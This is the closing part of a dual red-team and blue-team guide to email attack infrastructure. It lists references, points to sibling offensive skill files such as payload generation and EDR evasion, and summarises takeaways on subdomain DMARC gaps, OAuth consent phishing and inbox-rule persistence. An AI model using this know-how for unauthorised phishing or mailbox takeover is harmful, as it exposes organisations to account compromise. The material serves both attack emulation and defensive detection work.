- **Microsoft Security Blog — multi-stage AiTM/BEC (SharePoint abuse)**: [microsoft.com/en-us/security/blog/2026/01/21/multistage-aitm-phishing-bec-campaign-abusing-sharepoint](https://www.microsoft.com/en-us/security/blog/2026/01/21/multistage-aitm-phishing-bec-campaign-abusing-sharepoint/) — real-world AiTM/BEC chain
- **Sekoia — Global AiTM analysis**: [blog.sekoia.io/wp-content/uploads/2025/06/Sekoia_io___Global_analysis_of_Adversary_in_the_Middle_phishing_threats.pdf](https://blog.sekoia.io/wp-content/uploads/2025/06/Sekoia_io___Global_analysis_of_Adversary_in_the_Middle_phishing_threats.pdf)
- **Datadog — AiTM investigation (M365 + Okta)**: [securitylabs.datadoghq.com/articles/investigating-an-aitm-phishing-campaign-m365-okta](https://securitylabs.datadoghq.com/articles/investigating-an-aitm-phishing-campaign-m365-okta/)
- **CISA AiTM advisories**: [cisa.gov/news-events/cybersecurity-advisories](https://www.cisa.gov/news-events/cybersecurity-advisories) (search: adversary-in-the-middle)
- **Microsoft — OAuth consent phishing**: [learn.microsoft.com/en-us/defender-office-365/concept-email-confidential-sharepoint](https://learn.microsoft.com/en-us/microsoft-365/security/) — search "consent phishing"
- **Microsoft Graph — Inbox Rules API**: [learn.microsoft.com/graph/api/message-post-rules](https://learn.microsoft.com/graph/api/message-post-rules)
- **SendGrid v3 API (the format the ESP-sim mirrors)**: [docs.sendgrid.com/api-reference/mail-send](https://docs.sendgrid.com/api-reference/mail-send)
- **Mailgun API reference**: [documentation.mailgun.com/docs/mailgun/api-reference/intro.html](https://documentation.mailgun.com/docs/mailgun/api-reference/intro.html)
- **Amazon SES developer guide**: [docs.aws.amazon.com/ses](https://docs.aws.amazon.com/ses/)
- **MIMIC — Detection of malicious OAuth apps (Microsoft)**: [learn.microsoft.com/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants](https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants) — defender playbook for illicit consent grants
- **Responder (NTLM hash capture)**: [github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)
- **swaks (SMTP probe)**: [github.com/jetmore/swaks](https://github.com/jetmore/swaks)
- **checkdmarc**: [github.com/domainaware/checkdmarc](https://github.com/domainaware/checkdmarc)
- **dkimpy**: [launchpad.net/dkimpy](https://launchpad.net/dkimpy)

---

## Cross-References to Other Skills

- **`skills/email-protocol-attack/`** — Sibling skill, protocol layer. This guide's MTA Chain Forensics chapter builds on its SPF/DKIM/DMARC fundamentals. AiTM Refinements chapter chains its multi-hop MX primitives.
- **`skills/cloud-identity-attack/`** — Azure AD / O365 post-exploitation at depth. This guide's Mailbox Takeover chapter is the introduction; cloud-identity-attack covers lateral movement, role abuse, and persistence in depth.
- **`skills/web-auth-bypass/`** — Session and OAuth abuse fundamentals.
- **`skills/payload-generation/`** — What the payload does after HTML smuggling delivers it.
- **`skills/av-edr-evasion/`** — Endpoint evasion once the payload runs.
- **`skills/social-engineering/`** — Pretext design that gives the lure mail credibility.
- **`skills/osint/`** & **`skills/recon-osint/`** — Subdomain enumeration to find spoofable identities (used in the MTA Chain Forensics chapter).
- **`skills/active-directory/`** — NTLM relay and pass-the-hash fundamentals (referenced in the CVE-2024-21413 walk-through).
- **`skills/engagement-manager/`** — Scoping and authorization. **Read this before adapting any technique in this guide to a real engagement.**

---

## Guide Summary

This guide is orthogonal to the two sibling guides:

- The **playbook** is the campaign-operations runbook
- The **deep-dive** is the AiTM emulation lab manual
- **This guide** is the **infrastructure-internals + forensic-reading** companion

The five takeaways that matter most:

1. **The bottom-most `Received:` header is the only one you can fully trust.** Everything above it is hop-attestable but not hop-verifiable unless ARC `cv=pass` covers it.
2. **ARC preserves authentication across legitimate forwarding but does not help against an malicious originator.** A perfectly valid ARC chain just means "this was malicious at hop 1, and we proved it stayed malicious at every hop."
3. **DMARC does not inherit to subdomains.** Every subdomain needs its own DMARC record (or an organizational-domain `sp=` policy). The vast majority of "spoofable" findings are orphaned subdomains.
4. **OAuth consent phishing bypasses both MFA and AiTM.** The user consents interactively (so MFA is satisfied) and the attacker gets a token (so no session-cookie replay is needed). Admin-consent policies for high-privilege scopes are the only strong control.
5. **Mailbox-takeover persistence is uniformly auditable via `New-InboxRule`.** Outlook Rules, Graph API rules, and (separately) `New-TransportRule` for Mail-Flow Rules. Centralize these logs and alert on external forwarding.

For red-team operators, this guide's matrix tells you which bypass to pick per layer. For blue-team analysts, this guide's forensic-parser scripts and detection rules tell you how to reconstruct the chain and write detections.

---

*End of guide.*
